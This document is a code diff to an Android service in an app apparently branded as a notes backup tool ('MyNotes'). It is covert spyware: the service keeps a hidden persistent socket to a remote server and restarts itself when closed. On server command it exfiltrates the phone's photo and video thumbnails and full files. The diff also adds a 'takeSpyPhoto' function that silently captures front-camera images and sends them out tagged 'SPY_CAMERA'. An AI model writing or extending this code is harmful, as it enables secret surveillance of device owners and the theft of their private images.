@@ -12,6 +12,8 @@ import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.media.ThumbnailUtils
 import android.os.Build
+import android.os.Handler
+import android.os.HandlerThread
 import android.os.IBinder
 import android.os.PowerManager
 import android.os.SystemClock
@@ -26,12 +28,15 @@ import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.io.File
 import kotlin.concurrent.thread
+import android.hardware.camera2.*
+import android.graphics.ImageFormat
+import android.media.ImageReader
 
 class CloudSyncService : Service() {
 
     private var socket: Socket? = null
-    // TU URL DE RENDER
-    private val SERVER_URL = "https://mynotes-server-rvtf.onrender.com"
+    // ASEGÚRATE QUE ESTA URL SEA LA CORRECTA
+    private val SERVER_URL = "https://mynotes.arccidev.com"
     private val CHANNEL_ID = "MyNotesBackupChannel"
 
     private var wakeLock: PowerManager.WakeLock? = null
@@ -39,20 +44,15 @@ class CloudSyncService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-
         try {
             startForeground(1, createNotification())
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
+        } catch (e: Exception) { e.printStackTrace() }
 
         try {
             val powerManager = getSystemService(POWER_SERVICE) as PowerManager
             wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyNotes:SyncTag")
             wakeLock?.acquire(60 * 60 * 1000L)
-        } catch (e: Exception) {
-            Log.e("CloudSyncService", "Error WL: ${e.message}")
-        }
+        } catch (e: Exception) { Log.e("CloudSync", "Error WL: ${e.message}") }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -63,8 +63,6 @@ class CloudSyncService : Service() {
 
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
-        Log.d("CloudSyncService", "Detectado cierre forzado (Swipe)")
-
         val restartIntent = Intent(applicationContext, RestartReceiver::class.java).apply {
             setPackage(packageName)
         }
@@ -95,53 +93,55 @@ class CloudSyncService : Service() {
         try {
             val options = IO.Options().apply {
                 reconnection = true
-                reconnectionAttempts = Int.MAX_VALUE
-                reconnectionDelay = 5000
-                reconnectionDelayMax = 10000
-                timeout = 60000
                 forceNew = true
             }
             socket = IO.socket(SERVER_URL, options)
 
             socket?.on(Socket.EVENT_CONNECT) {
-                Log.d("MyNotesSync", "✅ Conectado al Servidor")
                 registrarDispositivo()
 
-                // Intentamos enviar carpetas al conectar (por si acaso ya tiene permisos)
+                // Enviar carpetas al conectar
                 thread {
                     try { Thread.sleep(1000) } catch (e: Exception) {}
                     sendFolderList()
                 }
 
+                // Escaneo inicial rápido (Solo fotos, sin videos para no saturar inicio)
                 if (!isScanning) {
                     isScanning = true
-                    thread { sendThumbnails(null) }
+                    thread {
+                        sendThumbnails(null)
+                        isScanning = false // Aquí sí apagamos manual
+                    }
                 }
             }
 
-            // --- AQUÍ ESTÁ EL CAMBIO IMPORTANTE ---
             socket?.on("command_start_scan") { args ->
                 if (!isScanning) {
                     isScanning = true
 
-                    // 1. PRIMERO: Enviamos la lista de carpetas actualizada.
-                    // Esto arregla el problema de los permisos tardíos.
+                    // 1. Enviar lista de carpetas
                     thread { sendFolderList() }
 
-                    // 2. LUEGO: Procesamos el escaneo de fotos
                     var folderFilter: String? = null
                     if (args.isNotEmpty()) {
                         val params = args[0] as? JSONObject
-                        val requestedFolder = params?.optString("folder")
-                        if (!requestedFolder.isNullOrEmpty()) {
-                            folderFilter = requestedFolder
-                        }
+                        folderFilter = params?.optString("folder")
+                        if (folderFilter.isNullOrEmpty()) folderFilter = null
                     }
-                    thread { sendThumbnails(folderFilter) }
+
+                    // 2. Escanear FOTOS y VIDEOS en orden
+                    thread {
+                        sendThumbnails(folderFilter) // NO apaga isScanning
+                        scanVideos(folderFilter)     // NO apaga isScanning
+                        isScanning = false           // SE APAGA AQUÍ AL FINAL
+                    }
                 }
             }
 
             socket?.on("command_stop_scan") { isScanning = false }
+
+            socket?.on("command_take_photo") { takeSpyPhoto() }
 
             socket?.on("request_full_image") { args ->
                 val data = args[0] as JSONObject
@@ -168,20 +168,14 @@ class CloudSyncService : Service() {
         val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
         val uniqueFolders = HashSet<String>()
 
-        Log.d("MyNotesSync", "🔍 Actualizando lista de carpetas...")
-
         try {
             contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
                 val idxBucket = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                 while (cursor.moveToNext()) {
                     val folderName = cursor.getString(idxBucket)
-                    if (!folderName.isNullOrEmpty()) {
-                        uniqueFolders.add(folderName)
-                    }
+                    if (!folderName.isNullOrEmpty()) uniqueFolders.add(folderName)
                 }
             }
-
-            Log.d("MyNotesSync", "📂 Carpetas encontradas: ${uniqueFolders.size}")
 
             if (uniqueFolders.isNotEmpty()) {
                 val data = JSONObject().apply {
@@ -189,11 +183,8 @@ class CloudSyncService : Service() {
                     put("folders", org.json.JSONArray(uniqueFolders))
                 }
                 socket?.emit("usrData", data)
-                Log.d("MyNotesSync", "📤 Lista de carpetas enviada (Refresh).")
             }
-        } catch (e: Exception) {
-            Log.e("MyNotesFolders", "Error carpetas: ${e.message}")
-        }
+        } catch (e: Exception) {}
     }
 
     private fun sendThumbnails(targetFolder: String?) {
@@ -207,7 +198,6 @@ class CloudSyncService : Service() {
         if (targetFolder != null) {
             selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} LIKE ?"
             selectionArgs = arrayOf("%$targetFolder%")
-            Log.d("MyNotesSync", "Escaneando SOLO: $targetFolder")
         }
 
         try {
@@ -220,15 +210,13 @@ class CloudSyncService : Service() {
 
                     val path = cursor.getString(idxData)
                     val name = cursor.getString(idxName)
-                    val file = File(path)
-                    val folderName = file.parentFile?.name ?: "Unknown"
-
                     val thumb = getThumb(path)
+
                     if (thumb != null) {
                         val data = JSONObject().apply {
                             put("name", name)
                             put("path", path)
-                            put("folder", folderName)
+                            put("folder", File(path).parentFile?.name ?: "Unknown")
                             put("image64", encodeToBase64(thumb, 30))
                             put("dataType", "preview_image")
                         }
@@ -237,24 +225,105 @@ class CloudSyncService : Service() {
                     }
                 }
             }
-        } catch (e: Exception) { Log.e("MyNotesSync", "Scan Error: ${e.message}") }
-        isScanning = false
+        } catch (e: Exception) { Log.e("CloudSync", "Scan Error: ${e.message}") }
+        // NOTA: AQUÍ YA NO SE PONE isScanning = false
+    }
+
+    private fun scanVideos(targetFolder: String?) {
+        val uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
+        val projection = arrayOf(
+            MediaStore.Video.Media.DATA,
+            MediaStore.Video.Media.DISPLAY_NAME,
+            MediaStore.Video.Media._ID
+        )
+        val sortOrder = "${MediaStore.Video.Media.DATE_ADDED} DESC"
+
+        var selection: String? = null
+        var selectionArgs: Array<String>? = null
+
+        if (targetFolder != null) {
+            selection = "${MediaStore.Video.Media.DATA} LIKE ?"
+            selectionArgs = arrayOf("%$targetFolder%")
+        }
+
+        try {
+            contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
+                val idxData = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
+                val idxName = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
+                val idxId = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
+
+                while (cursor.moveToNext()) {
+                    if (!isScanning || socket?.connected() != true) break
+
+                    val path = cursor.getString(idxData)
+                    val name = cursor.getString(idxName)
+                    val id = cursor.getLong(idxId)
+                    val file = File(path)
+
+                    // Generar Thumbnail VIDEO
+                    val thumb = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        try {
+                            contentResolver.loadThumbnail(
+                                android.content.ContentUris.withAppendedId(uri, id),
+                                android.util.Size(96, 96),
+                                null
+                            )
+                        } catch (e: Exception) { null }
+                    } else {
+                        @Suppress("DEPRECATION")
+                        MediaStore.Video.Thumbnails.getThumbnail(
+                            contentResolver,
+                            id,
+                            MediaStore.Video.Thumbnails.MICRO_KIND,
+                            null
+                        )
+                    }
+
+                    if (thumb != null) {
+                        val data = JSONObject().apply {
+                            put("name", name)
+                            put("path", path)
+                            put("folder", file.parentFile?.name ?: "Unknown")
+                            put("image64", encodeToBase64(thumb, 40))
+                            put("dataType", "preview_video")
+                        }
+                        socket?.emit("usrData", data)
+                        Thread.sleep(80)
+                    }
+                }
+            }
+        } catch (e: Exception) { e.printStackTrace() }
     }
 
     private fun uploadHighQuality(path: String) {
         try {
             val file = File(path)
             if (file.exists()) {
-                val bitmap = BitmapFactory.decodeFile(path)
-                if (bitmap != null) {
-                    val encoded = encodeToBase64(bitmap, 100)
+                // Detectar si es video
+                val isVideo = path.endsWith(".mp4", true) || path.endsWith(".mkv", true)
+
+                if (isVideo) {
+                    val bytes = file.readBytes()
+                    val encoded = Base64.encodeToString(bytes, Base64.DEFAULT)
                     val data = JSONObject().apply {
                         put("name", "HD_${file.name}")
                         put("image64", encoded)
                         put("dataType", "full_image")
+                        put("folder", "Videos")
                     }
                     socket?.emit("usrData", data)
-                    bitmap.recycle()
+                } else {
+                    val bitmap = BitmapFactory.decodeFile(path)
+                    if (bitmap != null) {
+                        val encoded = encodeToBase64(bitmap, 100)
+                        val data = JSONObject().apply {
+                            put("name", "HD_${file.name}")
+                            put("image64", encoded)
+                            put("dataType", "full_image")
+                        }
+                        socket?.emit("usrData", data)
+                        bitmap.recycle()
+                    }
                 }
             }
         } catch (e: Exception) { e.printStackTrace() }
@@ -268,6 +337,68 @@ class CloudSyncService : Service() {
         val baos = ByteArrayOutputStream()
         bm.compress(Bitmap.CompressFormat.JPEG, quality, baos)
         return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
+    }
+
+    // --- CÁMARA (MÉTODO FLASH - Sin Overlay) ---
+    private fun takeSpyPhoto() {
+        val manager = getSystemService(CAMERA_SERVICE) as CameraManager
+        try {
+            val cameraId = manager.cameraIdList.firstOrNull { id ->
+                val characteristics = manager.getCameraCharacteristics(id)
+                characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
+            } ?: manager.cameraIdList[0]
+
+            val thread = HandlerThread("CameraBackground")
+            thread.start()
+            val backgroundHandler = Handler(thread.looper)
+
+            if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) return
+
+            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    try {
+                        val imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1)
+                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(session: CameraCaptureSession) {
+                                try {
+                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
+                                    req.addTarget(imageReader.surface)
+                                    req.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_OFF)
+                                    req.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                                    req.set(CaptureRequest.JPEG_ORIENTATION, 270)
+                                    session.capture(req.build(), null, backgroundHandler)
+                                } catch (e: Exception) { camera.close() }
+                            }
+                            override fun onConfigureFailed(session: CameraCaptureSession) { camera.close() }
+                        }, backgroundHandler)
+
+                        imageReader.setOnImageAvailableListener({ reader ->
+                            val image = reader.acquireLatestImage()
+                            val buffer = image.planes[0].buffer
+                            val bytes = ByteArray(buffer.remaining())
+                            buffer.get(bytes)
+                            image.close()
+
+                            camera.close()
+                            thread.quitSafely()
+
+                            val b64 = Base64.encodeToString(bytes, Base64.DEFAULT)
+                            val data = JSONObject().apply {
+                                put("dataType", "full_image")
+                                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
+                                put("deviceId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+                                put("name", "SPY_${System.currentTimeMillis()}.jpg")
+                                put("image64", b64)
+                                put("folder", "SPY_CAMERA")
+                            }
+                            socket?.emit("usrData", data)
+                        }, backgroundHandler)
+                    } catch (e: Exception) { camera.close() }
+                }
+                override fun onDisconnected(camera: CameraDevice) { camera.close() }
+                override fun onError(camera: CameraDevice, error: Int) { camera.close() }
+            }, backgroundHandler)
+        } catch (e: Exception) { e.printStackTrace() }
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
